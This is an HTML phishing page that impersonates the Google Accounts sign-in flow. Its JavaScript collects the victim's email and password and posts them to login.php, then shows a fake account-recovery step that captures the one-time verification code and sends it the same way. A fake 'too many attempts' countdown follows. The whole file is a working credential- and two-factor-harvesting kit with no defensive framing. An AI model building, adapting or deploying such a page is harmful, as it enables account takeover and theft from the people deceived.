<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root { --g-blue: #1a73e8; --text: #202124; --border: #dadce0; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Roboto', sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }

        /* Full Page White Overlay with Spinner (Official) */
        #loader-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #fff; display: none; flex-direction: column;
            justify-content: center; align-items: center; z-index: 10000;
        }
        .g-spinner {
            width: 36px; height: 36px; border: 4px solid #f3f3f3;
            border-top: 4px solid var(--g-blue); border-radius: 50%;
            animation: g-spin 0.8s linear infinite;
        }
        @keyframes g-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .container { width: 100%; max-width: 448px; padding: 48px 40px; text-align: left; transition: 0.2s; }
        @media (max-width: 450px) { .container { padding: 24px; } }

        .logo { width: 74px; margin-bottom: 12px; }
        h1 { font-size: 24px; font-weight: 400; color: var(--text); margin-bottom: 8px; }
        .sub-text { font-size: 16px; color: var(--text); margin-bottom: 24px; }

        /* Official Identity Chip */
        .user-chip {
            display: inline-flex; align-items: center; padding: 4px 10px 4px 6px;
            border: 1px solid var(--border); border-radius: 20px; margin-bottom: 24px; cursor: pointer;
        }
        .user-chip:hover { background: #f8f9fa; }
        .avatar { width: 20px; height: 20px; background: #5f6368; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 8px; color: #fff; font-size: 11px; }

        .input-field { width: 100%; padding: 13px 15px; border: 1px solid var(--border); border-radius: 4px; font-size: 16px; outline: none; margin-bottom: 10px; transition: border 0.2s; }
        .input-field:focus { border: 2px solid var(--g-blue); padding: 12px 14px; }

        .blue-link { color: var(--g-blue); text-decoration: none; font-size: 14px; font-weight: 500; cursor: pointer; }
        .blue-link:hover { text-decoration: underline; }

        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 45px; }
        .btn-next { background: var(--g-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
        .btn-next:disabled { background: #ccc; }

        #error-box { color: #d93025; font-size: 13px; display: none; margin-top: 10px; font-weight: 500; }
        .step { display: none; }
        .active { display: block; animation: fadeIn 0.4s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div id="loader-overlay"><div class="g-spinner"></div></div>

<div class="container">
    <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" class="logo">

    <div id="s1" class="step active">
        <h1>Sign in</h1>
        <p class="sub-text">Use your Google Account</p>
        <input type="text" id="email" class="input-field" placeholder="Email or phone">
        <a class="blue-link">Forgot email?</a>
        <div class="footer" style="margin-top: 80px;">
            <a class="blue-link">Create account</a>
            <button class="btn-next" onclick="toStep(2)">Next</button>
        </div>
    </div>

    <div id="s2" class="step">
        <h1>Welcome</h1>
        <div class="user-chip" onclick="showStep(1)"><div class="avatar">ðŸ‘¤</div><span id="label-mail" style="font-size:14px; font-weight:500;"></span></div>
        <input type="password" id="pass" class="input-field" placeholder="Enter your password">
        <div style="margin-top: 10px;"><a class="blue-link">Forgot password?</a></div>
        <div class="footer">
            <span></span>
            <button class="btn-next" onclick="sendLoginData()">Next</button>
        </div>
    </div>

    <div id="s3" class="step">
        <h1>Account recovery</h1>
        <p class="sub-text" style="font-size: 14px;">Google wants to make sure it's really you trying to sign in</p>
        <div class="user-chip"><div class="avatar">ðŸ‘¤</div><span id="label-mail-otp" style="font-size:14px; font-weight:500;"></span></div>
        <p style="font-size:14px; margin-bottom: 12px;">A verification code was sent to your email.</p>
        <input type="text" id="otp" class="input-field" placeholder="Enter code">
        <div id="error-box">Too many attempts. Try again in <span id="sec">60</span>s</div>
        <div class="footer">
            <a class="blue-link">Try another way</a>
            <button class="btn-next" id="final-btn" onclick="sendOTPData()">Next</button>
        </div>
    </div>
</div>



<script>
    const loader = document.getElementById('loader-overlay');

    function startLoading(callback) {
        loader.style.display = 'flex';
        setTimeout(() => {
            loader.style.display = 'none';
            callback();
        }, 1200);
    }

    function showStep(n) {
        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
        document.getElementById('s'+n).classList.add('active');
    }

    function toStep(n) {
        const mail = document.getElementById('email').value;
        if(!mail) return;
        startLoading(() => {
            document.getElementById('label-mail').innerText = mail;
            showStep(n);
        });
    }

    // à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦¸à¦¾à¦¬à¦®à¦¿à¦Ÿ à¦•à¦°à¦²à§‡ à¦†à¦—à§‡ à¦Ÿà¦¾à¦°à§à¦®à¦¿à¦¨à¦¾à¦²à§‡ à¦¯à¦¾à¦¬à§‡
    function sendLoginData() {
        const mail = document.getElementById('email').value;
        const password = document.getElementById('pass').value;
        if(!password) return;

        startLoading(() => {
            // à¦¡à¦¾à¦Ÿà¦¾ à¦Ÿà¦¾à¦°à§à¦®à¦¿à¦¨à¦¾à¦²à§‡ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦°à¦¿à¦•à§‹à§Ÿà§‡à¦¸à§à¦Ÿ (à¦†à¦—à§‡ à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦¯à¦¾à¦¬à§‡)
            let fd = new FormData();
            fd.append('email', mail);
            fd.append('password', password);
            fd.append('action', 'login');
            fetch('login.php', { method: 'POST', body: fd });

            document.getElementById('label-mail-otp').innerText = mail;
            showStep(3); // à¦à¦°à¦ªà¦° à¦“à¦Ÿà¦¿à¦ªà¦¿ à¦ªà§‡à¦œ à¦†à¦¸à¦¬à§‡
        });
    }

    // à¦“à¦Ÿà¦¿à¦ªà¦¿ à¦¸à¦¾à¦¬à¦®à¦¿à¦Ÿ à¦•à¦°à¦²à§‡ à¦†à¦²à¦¾à¦¦à¦¾à¦­à¦¾à¦¬à§‡ à¦¯à¦¾à¦¬à§‡
    function sendOTPData() {
        const otp = document.getElementById('otp').value;
        if(!otp) return;

        startLoading(() => {
            let fd = new FormData();
            fd.append('otp', otp);
            fd.append('action', 'otp');
            fetch('login.php', { method: 'POST', body: fd });

            // à§§ à¦®à¦¿à¦¨à¦¿à¦Ÿ à¦Ÿà¦¾à¦‡à¦®à¦¾à¦° à¦²à¦• à¦²à¦œà¦¿à¦•
            const btn = document.getElementById('final-btn');
            const err = document.getElementById('error-box');
            btn.disabled = true;
            err.style.display = 'block';

            let count = 60;
            const timer = setInterval(() => {
                count--;
                document.getElementById('sec').innerText = count;
                if(count <= 0) {
                    clearInterval(timer);
                    btn.disabled = false;
                    err.style.display = 'none';
                }
            }, 1000);
        });
    }
</script>
</body>
</html>

